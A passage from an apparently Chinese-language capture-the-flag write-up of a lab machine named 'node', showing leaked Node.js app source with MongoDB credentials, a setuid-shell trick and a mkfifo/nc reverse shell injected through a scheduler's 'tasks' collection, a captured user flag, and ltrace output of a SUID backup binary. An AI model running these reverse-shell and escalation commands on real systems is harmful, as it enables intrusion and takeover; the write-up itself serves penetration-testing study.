&#125;</span><br><span class="hljs-string">      else if (!doc) &#123;</span><br><span class="hljs-string">        res.status(404).send(&#123; not_found: true &#125;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      else &#123;</span><br><span class="hljs-string">        res.send(doc);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.get(&#x27;/api/session&#x27;, function (req, res) &#123;</span><br><span class="hljs-string">    if (req.session.user) &#123;</span><br><span class="hljs-string">      res.send(&#123;</span><br><span class="hljs-string">        authenticated: true,</span><br><span class="hljs-string">        user: req.session.user</span><br><span class="hljs-string">      &#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    else &#123;</span><br><span class="hljs-string">      res.send(&#123;</span><br><span class="hljs-string">        authenticated: false</span><br><span class="hljs-string">      &#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.post(&#x27;/api/session/authenticate&#x27;, function (req, res) &#123;</span><br><span class="hljs-string">    var failureResult = &#123;</span><br><span class="hljs-string">      error: true,</span><br><span class="hljs-string">      message: &#x27;Authentication failed&#x27;</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if (!req.body.username || !req.body.password) &#123;</span><br><span class="hljs-string">      res.send(failureResult);</span><br><span class="hljs-string">      return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    db.collection(&#x27;users&#x27;).findOne(&#123; username: req.body.username &#125;, function (error, doc) &#123;</span><br><span class="hljs-string">      if (error) &#123;</span><br><span class="hljs-string">        res.status(500).send(&#123;</span><br><span class="hljs-string">          message:&quot;</span>Uh oh, something went wrong!<span class="hljs-string">&quot;,</span><br><span class="hljs-string">          error: true</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">      if (!doc) &#123;</span><br><span class="hljs-string">        res.send(failureResult);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">      var hash = crypto.createHash(&#x27;sha256&#x27;);</span><br><span class="hljs-string">      var cipherText = hash.update(req.body.password).digest(&#x27;hex&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">      if (cipherText == doc.password) &#123;</span><br><span class="hljs-string">        req.session.user = doc;</span><br><span class="hljs-string">        res.send(&#123;</span><br><span class="hljs-string">          success: true</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      else &#123;</span><br><span class="hljs-string">        res.send(&#123;</span><br><span class="hljs-string">          success: false</span><br><span class="hljs-string">        &#125;)</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.get(&#x27;/api/admin/backup&#x27;, function (req, res) &#123;</span><br><span class="hljs-string">    if (req.session.user &amp;&amp; req.session.user.is_admin) &#123;</span><br><span class="hljs-string">      var proc = spawn(&#x27;/usr/local/bin/backup&#x27;, [&#x27;-q&#x27;, backup_key, __dirname ]);</span><br><span class="hljs-string">      var backup = &#x27;&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">      proc.on(&quot;</span><span class="hljs-built_in">exit</span><span class="hljs-string">&quot;, function(exitCode) &#123;</span><br><span class="hljs-string">        res.header(&quot;</span>Content-Type<span class="hljs-string">&quot;, &quot;</span>text/plain<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        res.header(&quot;</span>Content-Disposition<span class="hljs-string">&quot;, &quot;</span>attachment; filename=myplace.backup<span class="hljs-string">&quot;);</span><br><span class="hljs-string">        res.send(backup);</span><br><span class="hljs-string">      &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">      proc.stdout.on(&quot;</span>data<span class="hljs-string">&quot;, function(chunk) &#123;</span><br><span class="hljs-string">        backup += chunk;</span><br><span class="hljs-string">      &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">      proc.stdout.on(&quot;</span>end<span class="hljs-string">&quot;, function() &#123;</span><br><span class="hljs-string">      &#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    else &#123;</span><br><span class="hljs-string">      res.send(&#123;</span><br><span class="hljs-string">        authenticated: false</span><br><span class="hljs-string">      &#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.use(function(req, res, next)&#123;</span><br><span class="hljs-string">    res.sendFile(&#x27;app.html&#x27;, &#123; root: __dirname &#125;);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">  app.listen(3000, function () &#123;</span><br><span class="hljs-string">    console.log(&#x27;MyPlace app listening on port 3000!&#x27;)</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">mark@node:~$ </span><br><span class="hljs-string">mark@node:~$ cat /var/scheduler/app.js</span><br><span class="hljs-string">const exec        = require(&#x27;child_process&#x27;).exec;</span><br><span class="hljs-string">const MongoClient = require(&#x27;mongodb&#x27;).MongoClient;</span><br><span class="hljs-string">const ObjectID    = require(&#x27;mongodb&#x27;).ObjectID;</span><br><span class="hljs-string">const url         = &#x27;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">MongoClient.connect(url, function(error, db) &#123;</span><br><span class="hljs-string">  if (error || !db) &#123;</span><br><span class="hljs-string">    console.log(&#x27;[!] Failed to connect to mongodb&#x27;);</span><br><span class="hljs-string">    return;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  setInterval(function () &#123;</span><br><span class="hljs-string">    db.collection(&#x27;tasks&#x27;).find().toArray(function (error, docs) &#123;</span><br><span class="hljs-string">      if (!error &amp;&amp; docs) &#123;</span><br><span class="hljs-string">        docs.forEach(function (doc) &#123;</span><br><span class="hljs-string">          if (doc) &#123;</span><br><span class="hljs-string">            console.log(&#x27;Executing task &#x27; + doc._id + &#x27;...&#x27;);</span><br><span class="hljs-string">            exec(doc.cmd);</span><br><span class="hljs-string">            db.collection(&#x27;tasks&#x27;).deleteOne(&#123; _id: new ObjectID(doc._id) &#125;);</span><br><span class="hljs-string">          &#125;</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">      else if (error) &#123;</span><br><span class="hljs-string">        console.log(&#x27;Something went wrong: &#x27; + error);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">  &#125;, 30000);</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">mark@node:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>20、在 MongoDB 中，数据库保存文档集合，即 MongoDB 将文档存储在集合中。集合类似于关系数据库中的表。我们看到 &#x2F;var&#x2F;scheduler&#x2F;app.js 连接到名为“scheduler”的 mondodb 数据库，在名为“tasks”的集合中搜索文档并执行其“cmd”字段。让我们连接到 mongodb 并在任务集合中插入一个新文档。我们希望用户 tom 执行的命令将位于“cmd”字段中。</p>
+<p>21、这边，其实是参照演示文档，进行命令权限的尝试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">mark@node:~$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k<br>MongoDB shell version: 3.2.16<br>connecting to: localhost:27017/scheduler<br>&gt; db.tasks.insert(&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;cp /bin/dash /tmp/dash; chmod u+s /tmp/dash&quot;</span>&#125;)<br>WriteResult(&#123; <span class="hljs-string">&quot;nInserted&quot;</span> : 1 &#125;)<br>&gt; db.tasks.<span class="hljs-function"><span class="hljs-title">find</span></span>()<br>&#123; <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;659815a4285b14155dcdf022&quot;</span>), <span class="hljs-string">&quot;cmd&quot;</span> : <span class="hljs-string">&quot;cp /bin/dash /tmp/dash; chmod u+s /tmp/dash&quot;</span> &#125;<br>&gt; <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">bye</span><br>mark@node:~$ <span class="hljs-built_in">ls</span> -la /tmp/dash<br>-rwsr-xr-x 1 tom tom 154072 Jan  5 14:44 /tmp/dash<br>mark@node:~$ /tmp/dash -p<br>$ <span class="hljs-built_in">id</span><br>uid=1001(mark) gid=1001(mark) euid=1000(tom) <span class="hljs-built_in">groups</span>=1001(mark)<br>$ <span class="hljs-built_in">cd</span> /home/tom<br>$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span>: user.txt: Permission denied<br>$ <span class="hljs-built_in">pwd</span><br>/home/tom<br>$ <span class="hljs-built_in">ls</span> -la<br>total 40<br>drwxr-xr-x 6 root root 4096 Aug 16  2022 .<br>drwxr-xr-x 5 root root 4096 Aug 31  2017 ..<br>lrwxrwxrwx 1 root root    9 Aug 16  2022 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 root root  220 Aug 29  2017 .bash_logout<br>-rw-r--r-- 1 root root 3771 Aug 29  2017 .bashrc<br>drwx------ 2 root root 4096 Aug 29  2017 .cache<br>drwxr-xr-x 3 root root 4096 Aug 30  2017 .config<br>-rw-r----- 1 root root    0 Sep  3  2017 .dbshell<br>-rwxr-xr-x 1 root root    0 Aug 30  2017 .mongorc.js<br>drwxrwxr-x 2 root root 4096 Aug 29  2017 .nano<br>drwxr-xr-x 5 root root 4096 Aug 31  2017 .npm<br>-rw-r--r-- 1 root root  655 Aug 29  2017 .profile<br>-rw-r----- 1 root tom    33 Jan  5 13:31 user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span>: user.txt: Permission denied<br>$ <br></code></pre></td></tr></table></figure>
+
+<p>22、结果，不行，没法读取，那就继续换一个命令吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">mark@node:~$ mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k<br>MongoDB shell version: 3.2.16<br>connecting to: localhost:27017/scheduler<br>&gt; db.tasks.insert(&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.5 443 &gt;/tmp/f&quot;</span>&#125;)<br>WriteResult(&#123; <span class="hljs-string">&quot;nInserted&quot;</span> : 1 &#125;)<br>&gt; db.tasks.find()<br>&gt; <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">bye</span><br>mark@node:~$<br></code></pre></td></tr></table></figure>
+
+<p>23、远程监听也成功的获取到了该tom的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443       <br>listening on [any] 443 ...<br>connect to [10.10.14.5] from (UNKNOWN) [10.10.10.58] 52620<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)</span><br><span class="hljs-string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class="hljs-string">See &quot;man sudo_root&quot; for details.</span><br><span class="hljs-string"></span><br><span class="hljs-string">tom@node:/$ pwd</span><br><span class="hljs-string">pwd</span><br><span class="hljs-string">/</span><br><span class="hljs-string">tom@node:/$ cd ~</span><br><span class="hljs-string">cd ~</span><br><span class="hljs-string">tom@node:~$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">user.txt</span><br><span class="hljs-string">tom@node:~$ cat user.txt</span><br><span class="hljs-string">cat user.txt</span><br><span class="hljs-string">adee6015f143049094151bc21cadca97</span><br><span class="hljs-string">tom@node:~$ </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>24、接下来就是常规提权与信息搜集了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@node:~$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 40<br>drwxr-xr-x 6 root root 4096 Aug 16  2022 .<br>drwxr-xr-x 5 root root 4096 Aug 31  2017 ..<br>lrwxrwxrwx 1 root root    9 Aug 16  2022 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 root root  220 Aug 29  2017 .bash_logout<br>-rw-r--r-- 1 root root 3771 Aug 29  2017 .bashrc<br>drwx------ 2 root root 4096 Aug 29  2017 .cache<br>drwxr-xr-x 3 root root 4096 Aug 30  2017 .config<br>-rw-r----- 1 root root    0 Sep  3  2017 .dbshell<br>-rwxr-xr-x 1 root root    0 Aug 30  2017 .mongorc.js<br>drwxrwxr-x 2 root root 4096 Aug 29  2017 .nano<br>drwxr-xr-x 5 root root 4096 Aug 31  2017 .npm<br>-rw-r--r-- 1 root root  655 Aug 29  2017 .profile<br>-rw-r----- 1 root tom    33 Jan  5 13:31 user.txt<br>tom@node:~$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> tom: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> tom: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> tom: <br><br>sudo: 3 incorrect password attempts<br>tom@node:~$ <br><br>tom@node:~$ <span class="hljs-built_in">cat</span> .config<br><span class="hljs-built_in">cat</span> .config<br><span class="hljs-built_in">cat</span>: .config: Is a directory<br>tom@node:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>tom@node:~$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 40<br>drwxr-xr-x 6 root root 4096 Aug 16  2022 .<br>drwxr-xr-x 5 root root 4096 Aug 31  2017 ..<br>lrwxrwxrwx 1 root root    9 Aug 16  2022 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 root root  220 Aug 29  2017 .bash_logout<br>-rw-r--r-- 1 root root 3771 Aug 29  2017 .bashrc<br>drwx------ 2 root root 4096 Aug 29  2017 .cache<br>drwxr-xr-x 3 root root 4096 Aug 30  2017 .config<br>-rw-r----- 1 root root    0 Sep  3  2017 .dbshell<br>-rwxr-xr-x 1 root root    0 Aug 30  2017 .mongorc.js<br>drwxrwxr-x 2 root root 4096 Aug 29  2017 .nano<br>drwxr-xr-x 5 root root 4096 Aug 31  2017 .npm<br>-rw-r--r-- 1 root root  655 Aug 29  2017 .profile<br>-rw-r----- 1 root tom    33 Jan  5 13:31 user.txt<br>tom@node:~$ <span class="hljs-built_in">cd</span> .config<br><span class="hljs-built_in">cd</span> .config<br>tom@node:~/.config$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x 3 root root 4096 Aug 30  2017 .<br>drwxr-xr-x 6 root root 4096 Aug 16  2022 ..<br>drwxr-xr-x 2 root root 4096 Sep  3  2017 configstore<br>tom@node:~/.config$ <span class="hljs-built_in">cd</span> configstore<br><span class="hljs-built_in">cd</span> configstore<br>tom@node:~/.config/configstore$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x 2 root root 4096 Sep  3  2017 .<br>drwxr-xr-x 3 root root 4096 Aug 30  2017 ..<br>-rw------- 1 root root  150 Sep  3  2017 update-notifier-npm.json<br>tom@node:~/.config/configstore$ <span class="hljs-built_in">cat</span> update-notifier-npm.json<br><span class="hljs-built_in">cat</span> update-notifier-npm.json<br><span class="hljs-built_in">cat</span>: update-notifier-npm.json: Permission denied<br>tom@node:~/.config/configstore$ <br></code></pre></td></tr></table></figure>
+
+<p>25、发现还是不行的，其实，到这里还是遗留了一些信息，上面的 app.js 里泄露了一些信息，让我们检查一下 &#x2F;var&#x2F;www&#x2F;myplace&#x2F;app.js：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@node:~$ <span class="hljs-built_in">cat</span> /var/www/myplace/app.js<br><span class="hljs-built_in">cat</span> /var/www/myplace/app.js<br><br>  app.get(<span class="hljs-string">&#x27;/api/admin/backup&#x27;</span>, <span class="hljs-keyword">function</span> (req, res) &#123;<br>    <span class="hljs-keyword">if</span> (req.session.user &amp;&amp; req.session.user.is_admin) &#123;<br>      var proc = spawn(<span class="hljs-string">&#x27;/usr/local/bin/backup&#x27;</span>, [<span class="hljs-string">&#x27;-q&#x27;</span>, backup_key, __dirname ]);<br>      var backup = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>tom@node:~$ <span class="hljs-built_in">ls</span> -la /usr/local/bin/backup<br><span class="hljs-built_in">ls</span> -la /usr/local/bin/backup<br>-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup<br>tom@node:~$ <br></code></pre></td></tr></table></figure>
+
+<p>26、有趣的。它是 root 拥有的 SUID 可执行文件！我打赌我们可以找到很多方法来利用这个备份应用程序。让我们使用 ltrace 来探索它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@node:~$ ltrace /usr/local/bin/backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /tmp/a<br>&lt;b2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /tmp/a              <br>__libc_start_main(0x80489fd, 4, 0xffdcf734, 0x80492c0 &lt;unfinished ...&gt;<br>geteuid()                                        = 1000<br>setuid(1000)                                     = 0<br>strcmp(<span class="hljs-string">&quot;-q&quot;</span>, <span class="hljs-string">&quot;-q&quot;</span>)                               = 0<br>strncpy(0xffdcf5f8, <span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>..., 100) = 0xffdcf5f8<br>strcpy(0xffdcf5e1, <span class="hljs-string">&quot;/&quot;</span>)                          = 0xffdcf5e1<br>strcpy(0xffdcf5ed, <span class="hljs-string">&quot;/&quot;</span>)                          = 0xffdcf5ed<br>strcpy(0xffdcf577, <span class="hljs-string">&quot;/e&quot;</span>)                         = 0xffdcf577<br>strcat(<span class="hljs-string">&quot;/e&quot;</span>, <span class="hljs-string">&quot;tc&quot;</span>)                               = <span class="hljs-string">&quot;/etc&quot;</span><br>strcat(<span class="hljs-string">&quot;/etc&quot;</span>, <span class="hljs-string">&quot;/m&quot;</span>)                             = <span class="hljs-string">&quot;/etc/m&quot;</span><br>strcat(<span class="hljs-string">&quot;/etc/m&quot;</span>, <span class="hljs-string">&quot;yp&quot;</span>)                           = <span class="hljs-string">&quot;/etc/myp&quot;</span><br>strcat(<span class="hljs-string">&quot;/etc/myp&quot;</span>, <span class="hljs-string">&quot;la&quot;</span>)                         = <span class="hljs-string">&quot;/etc/mypla&quot;</span><br>strcat(<span class="hljs-string">&quot;/etc/mypla&quot;</span>, <span class="hljs-string">&quot;ce&quot;</span>)                       = <span class="hljs-string">&quot;/etc/myplace&quot;</span><br>strcat(<span class="hljs-string">&quot;/etc/myplace&quot;</span>, <span class="hljs-string">&quot;/k&quot;</span>)                     = <span class="hljs-string">&quot;/etc/myplace/k&quot;</span><br>strcat(<span class="hljs-string">&quot;/etc/myplace/k&quot;</span>, <span class="hljs-string">&quot;ey&quot;</span>)                   = <span class="hljs-string">&quot;/etc/myplace/key&quot;</span><br>strcat(<span class="hljs-string">&quot;/etc/myplace/key&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>)                  = <span class="hljs-string">&quot;/etc/myplace/keys&quot;</span><br>fopen(<span class="hljs-string">&quot;/etc/myplace/keys&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)                  = 0x8810008<br>fgets(<span class="hljs-string">&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;</span>..., 1000, 0x8810008) = 0xffdcf18f<br>strcspn(<span class="hljs-string">&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;</span>..., <span class="hljs-string">&quot;\n&quot;</span>) = 64<br>strcmp(<span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>..., <span class="hljs-string">&quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;</span>...) = -1<br>fgets(<span class="hljs-string">&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;</span>..., 1000, 0x8810008) = 0xffdcf18f<br>strcspn(<span class="hljs-string">&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;</span>..., <span class="hljs-string">&quot;\n&quot;</span>) = 64<br>strcmp(<span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>..., <span class="hljs-string">&quot;45fac180e9eee72f4fd2d9386ea7033e&quot;</span>...) = -1<br>fgets(<span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>..., 1000, 0x8810008) = 0xffdcf18f<br>strcspn(<span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>..., <span class="hljs-string">&quot;\n&quot;</span>) = 64<br>strcmp(<span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>..., <span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>...) = 0<br>fgets(<span class="hljs-string">&quot;\n&quot;</span>, 1000, 0x8810008)                     = 0xffdcf18f<br>strcspn(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>)                              = 0<br>strcmp(<span class="hljs-string">&quot;3de811f4ab2b7543eaf45df611c2dd25&quot;</span>..., <span class="hljs-string">&quot;&quot;</span>) = 1<br>fgets(nil, 1000, 0x8810008)                      = 0<br>strstr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&quot;..&quot;</span>)                           = nil<br>strstr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&quot;/root&quot;</span>)                        = nil<br>strchr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&#x27;;&#x27;</span>)                            = nil<br>strchr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>)                            = nil<br>strchr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&#x27;`&#x27;</span>)                            = nil<br>strchr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&#x27;$&#x27;</span>)                            = nil<br>strchr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&#x27;|&#x27;</span>)                            = nil<br>strstr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&quot;//&quot;</span>)                           = nil<br>strcmp(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)                            = 1<br>strstr(<span class="hljs-string">&quot;/tmp/a&quot;</span>, <span class="hljs-string">&quot;/etc&quot;</span>)                         = nil<br>strcpy(0xffdcef9b, <span class="hljs-string">&quot;/tmp/a&quot;</span>)                     = 0xffdcef9b<br>getpid()                                         = 1922<br>time(0)                                          = 1704466827<br>clock(0, 0, 0, 0)                                = 1312<br>srand(0x89fd1aff, 0x28a36f5f, 0x89fd1aff, 0x804918c) = 0<br>rand(0, 0, 0, 0)                                 = 0x305db0f1<br>sprintf(<span class="hljs-string">&quot;/tmp/.backup_811446513&quot;</span>, <span class="hljs-string">&quot;/tmp/.backup_%i&quot;</span>, 811446513) = 22<br>sprintf(<span class="hljs-string">&quot;/usr/bin/zip -r -P magicword /tm&quot;</span>..., <span class="hljs-string">&quot;/usr/bin/zip -r -P magicword %s &quot;</span>..., <span class="hljs-string">&quot;/tmp/.backup_811446513&quot;</span>, <span class="hljs-string">&quot;/tmp/a&quot;</span>) = 70<br>system(<span class="hljs-string">&quot;/usr/bin/zip -r -P magicword /tm&quot;</span>... &lt;no <span class="hljs-built_in">return</span> ...&gt;<br>--- SIGCHLD (Child exited) ---<br>&lt;... system resumed&gt; )                           = 3072<br>access(<span class="hljs-string">&quot;/tmp/.backup_811446513&quot;</span>, 0)              = -1<br>remove(<span class="hljs-string">&quot;/tmp/.backup_811446513&quot;</span>)                 